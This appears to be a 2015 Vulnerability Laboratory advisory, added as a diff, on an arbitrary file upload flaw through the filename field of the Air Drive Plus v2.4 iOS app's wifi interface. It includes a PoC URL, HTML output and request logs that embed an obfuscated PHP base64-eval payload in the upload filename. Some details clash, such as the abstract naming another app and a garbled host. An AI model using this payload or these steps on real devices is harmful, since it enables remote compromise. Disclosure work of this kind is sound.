@@ -1,0 +1,190 @@
+Document Title:
+===============
+Air Drive Plus v2.4 iOS - Arbitrary File Upload Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1597
+
+
+Release Date:
+=============
+2015-09-21
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1597
+
+
+Common Vulnerability Scoring System:
+====================================
+8.7
+
+
+Product & Service Introduction:
+===============================
+Turn your iPhone, iPod touch, and iPad into a wireless disk. Share your files and photos over network, no USB cable or extra software required.
+
+(Copy of the Vendor Homepage: https://itunes.apple.com/tr/app/air-drive-plus-your-file-manager/id422806570 )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Research Team discovered an arbitrary file upload web vulnerability in the official Photo Transfer 2 - v1.0 iOS mobile web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-09-21:	Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Y.K. YING
+Product: Air Drive Plus - iOS Mobile (Web-Application) 2.4
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+An arbitrary file upload web vulnerability has been discovered in the official Air Drive Plus v2.4 iOS web-application.
+The arbitrary file upload web vulnerability allows remote attackers to unauthorized include local file/path requests 
+or system specific path commands to compromise the mobile web-application.
+
+The web vulnerability is located in the `filename` value of the `Upload` module. Remote attackers are able to inject own files with 
+malicious `filename` values in the `Upload` POST method request to compromise the mobile web-application. The local file/path include 
+execution occcurs in the index file dir listing and sub folders of the wifi interface. The attacker is able to inject the lfi payload 
+by usage of the wifi interface or local file sync function. 
+
+Attackers are also able to exploit the filename issue in combination with persistent injected script code to execute different malicious 
+attack requests. The attack vector is located on the application-side of the wifi service and the request method to inject is POST. 
+
+The security risk of the local file include vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 8.7. 
+Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege web-application user account. 
+Successful exploitation of the arbitrary file upload vulnerability results in mobile application compromise or connected device component compromise.
+
+Request Method(s):
+				[+] [POST]
+
+Vulnerable Module(s):
+				[+] Upload
+
+Vulnerable Parameter(s):
+				[+] filename
+
+Affected Module(s):
+				[+] Index File Dir Listing (http://localhost:8000/)
+
+
+Proof of Concept (PoC):
+=======================
+The arbitrary file upload web vulnerability can be exploited by remote attacker without privilege web-application user acocunt or user interaction.
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC Payload(s):
+http://localhost:8000/AirDriveAction_file_show/%3C./[ARBITRARY FILE UPLOAD VULNERABILITY VIA FILENAME!]%20src=a%3E2.png
+
+
+PoC: Source (Upload File)
+<tbody id="files"><tr><td colspan="8"><a href="#" onclick="javascript:loadfiles("/AirDriveAction_ROOTLV")">.</a></td></tr><tr><td colspan="8"><a href="#" onclick="javascript:loadfiles("/AirDriveAction_UPPERLV")">..</a></td></tr><tr class=""><td><img src="./images/file.png" height="20px" width="20px"></td><td><a target="_blank" href="/AirDriveAction_file_show/68-2.png">68-2.png</a></td><td>24,27KB</td><td align="center">2015-09-11 13:13:25</td><td align="center"><a onclick="javascript:delfile("68-2.png");" class="transparent_button">Delete</a></td></tr><tr class=""><td><img src="./images/file.png" height="20px" width="20px"></td><td><a target="_blank" href="/AirDriveAction_file_show/%3C./[ARBITRARY FILE UPLOAD VULNERABILITY VIA FILENAME!]">2.png</a></td><td>538,00B</td><td align='center'>2015-09-11 13:17:21</td><td align='center'><a onclick='javascript:delfile("%3C./[ARBITRARY FILE UPLOAD VULNERABILITY VIA FILENAME!]%20src=a%3E2.png");' class='transparent_button'>Delete</a></td></tr></tbody></table></iframe></a></td></tr></tbody>
+
+
+--- PoC Session Logs [POST] ---
+Status: pending[]
+POST http://localhost:8000/AirDriveAction_file_add Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[unknown] Mime Type[unknown]
+   Request Header:
+      Host[localhost:8000:8000]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8000/index_files.html]
+   POST-Daten:
+      POST_DATA[-----------------------------52852184124488
+Content-Disposition: form-data; name="uploadfile"; filename="<?php
+//Obfuscation provided by BKM - PHP Obfuscator v2.47: $kda1640d3bfb="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";@eval($kda1640d3bfb(
+"JGU3NTJiNzQxMTZhYzYwMjUzMDFiYWNlOGUwZTA2YmNiPSJc ...   ...   ...2MVx4MzhcNjJceDMwXDY3XHgzOFw2M1x4MzlcNjBceDM3XDE0Mlx4MzZcNjdceDM5XDE0NFx4MzVcMTQzXHg2Nlw
+xNDZceDY1XDYzXHgzN1wxNDEiKT8kYjdkOTFjZDYwMzJlNDRiNDgzY2Y5MGRhOWM4ZmI1MDAoKTokdTZiZmM2YmN
+jZjRiMjk4ZDkyZTQzMzFhMzY3MzllMjAoKTs="));
+?>
+2.png"
+Content-Type: image/png
+
+Status: 200[OK] 
+GET http://localhost:8000/a[ARBITRARY FILE UPLOAD VULNERABILITY!] Load Flags[LOAD_DOCUMENT_URI  ] Größe des Inhalts[unknown] Mime Type[unknown]
+   Request Header:
+      Host[localhost:8000]
+      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8000/index_files.html]
+ 
+
+
+Reference(s):
+http://localhost:8000/index_files.html
+http://localhost:8000/AirDriveAction_file_add/
+http://1localhost:8000/AirDriveAction_file_show/
+
+
+Security Risk:
+==============
+The security risk of the arbitrary file upload web vulnerability in the filename value is estimated as high. (CVSS 8.7)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
+
